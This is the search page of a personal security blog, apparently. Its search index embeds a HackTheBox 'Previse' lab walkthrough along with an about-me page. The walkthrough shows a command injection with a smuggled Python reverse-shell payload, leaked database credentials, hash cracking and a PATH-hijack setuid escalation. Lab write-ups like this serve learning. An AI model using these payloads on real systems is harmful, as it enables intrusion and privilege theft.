<!DOCTYPE html>
<html lang="en">
<head>
<title>Search :: RoundofThree</title>
<meta content="text/html; charset=utf-8" http-equiv="content-type"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<meta content="" name="description"/>
<meta content="[hacking kaggle blog resume hackthebox machine-learning reverse-engineering infosec]" name="keywords"/>
<meta content="noodp" name="robots"/>
<link href="/search/" rel="canonical"/>
<link href="/assets/style.css" rel="stylesheet"/>
<link href="/img/apple-touch-icon-192x192.png" rel="apple-touch-icon"/>
<link href="/favicon.png" rel="shortcut icon"/>
<meta content="summary" name="twitter:card"/>
<meta content="" name="twitter:site"/>
<meta content="" name="twitter:creator"/>
<meta content="en" property="og:locale"/>
<meta content="website" property="og:type"/>
<meta content="Search" property="og:title"/>
<meta content="" property="og:description"/>
<meta content="/search/" property="og:url"/>
<meta content="RoundofThree" property="og:site_name"/>
<meta content="/favicon.png" property="og:image"/>
<meta content="2048" property="og:image:width"/>
<meta content="1024" property="og:image:height"/>
<link href="/search/index.xml" rel="alternate" title="RoundofThree" type="application/rss+xml"/>
</head>
<body class="orange">
<div class="container center headings--one-size">
<header class="header">
<div class="header__inner">
<div class="header__logo">
<a href="/">
<div class="logo">
    RoundofThree
  </div>
</a>
</div>
<div class="menu-trigger">menu</div>
</div>
<nav class="menu">
<ul class="menu__inner menu__inner--desktop">
<li><a href="/general">General</a></li>
<li><a href="/labs">Labs</a></li>
<li><a href="/research">Research</a></li>
<li><a href="/">Whoami</a></li>
</ul>
<ul class="menu__inner menu__inner--mobile">
<li><a href="/general">General</a></li>
<li><a href="/labs">Labs</a></li>
<li><a href="/research">Research</a></li>
<li><a href="/">Whoami</a></li>
</ul>
</nav>
</header>
<form action="/search/" id="search" method="get">
<label for="search-input" hidden="">Search site</label>
<input id="search-input" name="query" placeholder="Type here to search" type="text"/>
<input type="submit" value="search"/>
</form>
<div class="content">
<ul id="results">
<li>
        Enter a keyword above to search this site.
    </li>
</ul>
<script>
    window.store = {
        
        
        
        
        "\/tags\/hackthebox\/": {
            
            "title": "HackTheBox",
            "tags": [],
            "content": "", 
            "url": "\/tags\/hackthebox\/"
        },
        
        
        
        "\/labs\/": {
            
            "title": "Labs",
            "tags": [],
            "content": "", 
            "url": "\/labs\/"
        },
        
        
        
        "\/labs\/previse\/": {
            
            "title": "Previse - HackTheBox machine",
            "tags": ["HackTheBox",],
            "content": " Rank: easy  These are the notes I took while attacking the machine. Note that it contains failed attempts that lead to dead ends but I edited them a bit to make the steps easier to follow.\nPart of this article is encrypted with password:\n  --- DON'T MODIFY THIS LINE --- Enumeration Previse walkthrough Enumeration 1- Nmap discovers tcp 22 and 80 ports. {{ }}\n# Nmap 7.91 scan initiated Thu Aug 12 05:08:52 2021 as: nmap -sV -sC -oA nmap -p- -v previse.htb Nmap scan report for previse.htb (10.10.11.104) Host is up (0.068s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA) | 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA) |_ 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-favicon: Unknown favicon MD5: B21DD667DF8D81CAE6DD1374DD548004 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.29 (Ubuntu) | http-title: Previse Login |_Requested resource was login.php Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Aug 12 05:17:04 2021 -- 1 IP address (1 host up) scanned in 491.95 seconds {{ }}\n2- http://previse.htb/login.php is a login page. Intercept POST packet with filled parameters to login.php and save it to request.txt.\nTry with SQLi:\nsqlmap -r request.txt -p password # (try with username param too) No SQLi flaws discovered by sqlmap.\n3- Fuzz the request path.\nwfuzz -w /opt/SecLists/Discovery/Web-Content/raft-large-files.txt --hc=404 http://previse.htb Interesting files:\nindex.php -- 302 Found --\u0026gt; RESPONSE1 (see step 4 for details) login.php config.php download.php -- 302 --\u0026gt; login.php header.php footer.php status.php -- 302 --\u0026gt; MySQL server is running! nav.php accounts.php -- 302 --\u0026gt; Create an admin account files.php -- 302 --\u0026gt; backup.zip YEAH!!! Site backups are very welcome! 4- Intercept request packet with BurpSuite and intercept the response. See annotations above.\nRESPONSE1: portal page with links to Home (index.php), create account (accounts.php), files.php, management menu (status.php) and log data (file_log.php).\n5- The only interesting things are backup.zip and the page to create an account. Unzip backup.zip. Look at the config.php. {{ }}\n\u0026lt;?php function connectDB(){ $host = \u0026#39;localhost\u0026#39;; $user = \u0026#39;root\u0026#39;; $passwd = \u0026#39;mySQL_p@ssw0rd!:)\u0026#39;; $db = \u0026#39;previse\u0026#39;; $mycon = new mysqli($host, $user, $passwd, $db); return $mycon; } ?\u0026gt;{{ }}\nMySQL credentials:\nroot mySQL_p@ssw0rd!:) DBname: previse But we can only access the database from localhost\u0026hellip; Try reusing the credentials with ssh. Impossible though that the SSH root user is the SQL user, so we still need a username. Besides, the password does look like it\u0026rsquo;s specific to MySQL service.\n6- Revise all files in the site backup folder. Look at logs.php. exec() promises a command injection opportunity.\n{{ }}\n\u0026lt;?php session_start(); if (!isset($_SESSION[\u0026#39;user\u0026#39;])) { header(\u0026#39;Location: login.php\u0026#39;); exit; } ?\u0026gt;\u0026lt;?php if (!$_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] == \u0026#39;POST\u0026#39;) { header(\u0026#39;Location: login.php\u0026#39;); exit; } ///////////////////////////////////////////////////////////////////////////////////// //I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER// ///////////////////////////////////////////////////////////////////////////////////// $output = exec(\u0026#34;/usr/bin/python /opt/scripts/log_process.py {$_POST[\u0026#39;delim\u0026#39;]}\u0026#34;); echo $output; $filepath = \u0026#34;/var/www/out.log\u0026#34;; $filename = \u0026#34;out.log\u0026#34;; if(file_exists($filepath)) { header(\u0026#39;Content-Description: File Transfer\u0026#39;); header(\u0026#39;Content-Type: application/octet-stream\u0026#39;); header(\u0026#39;Content-Disposition: attachment; filename=\u0026#34;\u0026#39;.basename($filepath).\u0026#39;\u0026#34;\u0026#39;); header(\u0026#39;Expires: 0\u0026#39;); header(\u0026#39;Cache-Control: must-revalidate\u0026#39;); header(\u0026#39;Pragma: public\u0026#39;); header(\u0026#39;Content-Length: \u0026#39; . filesize($filepath)); ob_clean(); // Discard data in the output buffer flush(); // Flush system headers readfile($filepath); die(); } else { http_response_code(404); die(); } ?\u0026gt; {{ }}\nThe interesting part is here:\n{{ }}\n$output = exec(\u0026#34;/usr/bin/python /opt/scripts/log_process.py {$_POST[\u0026#39;delim\u0026#39;]}\u0026#34;); echo $output; {{ }}\nWe can trigger a reverse shell.\nTarget command:\npython log_process.py comma;python3 -c \u0026#39;import pty,os,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;ATTACKER_IP\u0026#34;,ATTACKER_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; Change the POST param in Burpsuite: {{ }}\nPOST /logs.php HTTP/1.1 Host: previse.htb User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 11 Origin: http://previse.htb DNT: 1 Connection: close Referer: http://previse.htb/file_logs.php Cookie: PHPSESSID=irv4p251afkcliqfqp41f03jbe Upgrade-Insecure-Requests: 1 Sec-GPC: 1 delim=comma;python3+-c+'import+os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026quot;10.0.0.1\u0026quot;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\u0026quot;/bin/bash\u0026quot;)' {{ }}\n7- To escalate from a www-data account, I am used to look for config files and database. Use the previously obtained MySQL credentials to access the database using the reverse shell:\nmysql -u root -p Enter password: mySQL_p@ssw0rd!:) \u0026gt; use previse; \u0026gt; show tables; # accounts and files \u0026gt; select * from accounts; # columns id, username, password and created_at So, the username is m4lwhere and we have a password hash in md5crypt. Save the hash to hash.txt and crack it with Hashcat.\nhashcat -a 0 -m 500 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt Same but with \u0026ndash;show:\nusername = m4lwhere hash = $1$ðŸ§‚llol$DQpmdvnb7EeuO6UaqRItf. password = ilovecody112235! Note that john doesn\u0026rsquo;t support non-printable characters in hash.\n8- SSH and get user.txt: c6a4ac1ae3f1152e13cdfd5f6005673f\nPrivilege escalation 9- sudo -l reveals the script /opt/scripts/access_backup.sh.\n10- Copy to local machine:\nscp m4lwhere@previse.htb:/opt/scripts/access_backup.sh . By looking at this file, we find command path vulnerability.\n{{ }}\n#!/bin/bash  # We always make sure to store logs, we take security SERIOUSLY here # I know I shouldnt run this as root but I cant figure it out programmatically on my account # This is configured to run with cron, added to sudo so I can run as needed - we\u0026#39;ll fix it later when there\u0026#39;s time gzip -c /var/log/apache2/access.log \u0026gt; /var/backups/$(date --date=\u0026#34;yesterday\u0026#34; +%Y%b%d)_access.gz gzip -c /var/www/file_access.log \u0026gt; /var/backups/$(date --date=\u0026#34;yesterday\u0026#34; +%Y%b%d)_file_access.gz {{ }}\n11- We can put a script named gzip in the current workdir and execute access_backup.sh as root.\ncd /tmp # set gzip to be bash with setuid bit cat \u0026lt;\u0026lt; EOF \u0026gt; gzip #!/bin/bash cp /bin/bash /tmp/c chmod u+s /tmp/c EOF 12- Now /tmp/c is a setuid bash.\n/tmp/c -p (this flag sets the real userid as the effective userid) root.txt: 23c44ab8465e7ff51a5fab75847e088b\n ", 
            "url": "\/labs\/previse\/"
        },
        
        
        
        "\/tags\/": {
            
            "title": "Tags",
            "tags": [],
            "content": "", 
            "url": "\/tags\/"
        },
        
        
        
        "\/": {
            
            "title": "Whoami",
            "tags": [],
            "content": "RoundofThree (Zhuo Ying Jiang Li)  Email: zhuoyingjiangli@gmail.com Github HackTheBox. Rank: Pro Hacker. Global ranking (last updated 2021/09/05): 504 Leetcode. Ranking (last updated 2021/09/05): 3691 CV.pdf  Introduction I\u0026rsquo;m\nCoding in Golang, Python \u0026hellip;\nHacking in HackTheBox, Leetcode, Kaggle \u0026hellip;\nReading all things about infosec \u0026hellip;\nPlaying Genshin \u0026hellip;\nLoving ACG!\nSkills  In descending order of proficiency: Python, Golang, C++, Rust, Ruby, Java Web backend: Golang Gin, Ruby on Rails, Express Scripting: Python, Golang Windows Internals and forensics   Malware analysis (maldocs, js, powershell) and reverse engineering assembly Pentesting vulnerable boxes and networks at HackTheBox ML: Tensorflow, XGBoost, LightGBM, Optuna Artificial Intelligence Planning: PDDL Web frontend: VueJS 3, React Mobile app: React Native LaTex  Projects  Hacker tools and exploits  HTB machines writeups (encrypted) Automated baselining (Batchfile)   Web/Software development  MapReduce minimal implementation in Golang (MIT Distributed Systems 6.824). See official course page. Raft implementation in Golang (MIT Distributed Systems 6.824) Nyxeon (Golang Gin + VueJS 3 first project) King\u0026rsquo;s College London Chinese Alumni Association website CMS API and online payment (Ruby on Rails). Private. Online health monitoring and scheduling system (Ruby on Rails). School project. King\u0026rsquo;s College London Chinese Student Association WeChat miniprogram. Private. Bank scam honeypot web application (Ruby on Rails). School project. AirBnB market listing desktop application (JavaFX, first year coursework).   ML \u0026amp; CV \u0026amp; AI algorithms  Kaggle workflow: a template to clean, do feature engineering, model and ensemble (Python) Kaggle competitions repositories and notebooks (Python, ScikitLearn, Tensorflow, XGBoost, LightGBM) Sokoban solver using PDDL (OPTIC solver) Python scripts: watermark removal, DPLL SAT solver\u0026hellip; Google Hashcode: traffic planning (Python)    Experience  Hacker tools, techniques, exploits and incident handling training at SANS Institute GIAC GCIH certified Joined the GIAC Advisory Board King\u0026rsquo;s College London Computer Science First \u0026amp; Second Year Award King\u0026rsquo;s College London Computer Science with Management Award IB 45 points Silver medal at Iberoamerican Chemistry Olympics Silver medals at Spanish National Chemistry and Physics Olympics  ", 
            "url": "\/"
        },
        
        
        
        "\/research\/": {
            
            "title": "Researches",
            "tags": [],
            "content": "", 
            "url": "\/research\/"
        },
        
        
        
        "\/research\/test\/": {
            
            "title": "Test",
            "tags": [],
            "content": "", 
            "url": "\/research\/test\/"
        },
        
        
        
        "\/general\/": {
            
            "title": "Generals",
            "tags": [],
            "content": "", 
            "url": "\/general\/"
        },
        
        
        
        "\/general\/migration\/": {
            
            "title": "Migration from previous blog",
            "tags": [],
            "content": "It\u0026rsquo;s been a while since I last wrote for my personal blog. Last year, while I was in 2nd year of Bachelor, I wrote more articles about Data Structures and Algorithms, and little things I found to be fancy about pentesting. After a year of self teaching and research, I\u0026rsquo;m now focusing more on reverse engineering, malware analysis and using data science for faster analysis. There are so many things that I want to know better, but I struggle because they are undocumented, and that\u0026rsquo;s why I decided to retake this. This blog is mainly for my own tracking but I hope it\u0026rsquo;s helpful for others and that I will update this more often!\nThe old blog is still stored at the master branch of RoundofThree/roundofthree.github.io.\n", 
            "url": "\/general\/migration\/"
        },
        
        
        
        "\/categories\/": {
            
            "title": "Categories",
            "tags": [],
            "content": "", 
            "url": "\/categories\/"
        },
        
        
        
        "\/search\/": {
            
            "title": "Search",
            "tags": [],
            "content": "", 
            "url": "\/search\/"
        },
        
    }
</script>
<script src="/assets/lunr.min.js"></script>
<script src="/assets/search.js"></script>
</div>
<footer class="footer">
<div class="footer__inner">
<div class="copyright copyright--user">
<span>Â© 2021 RoundofThree</span>
</div>
</div>
</footer>
<script src="/assets/main.js"></script>
<script src="/assets/prism.js"></script>
</div>
</body>
</html>
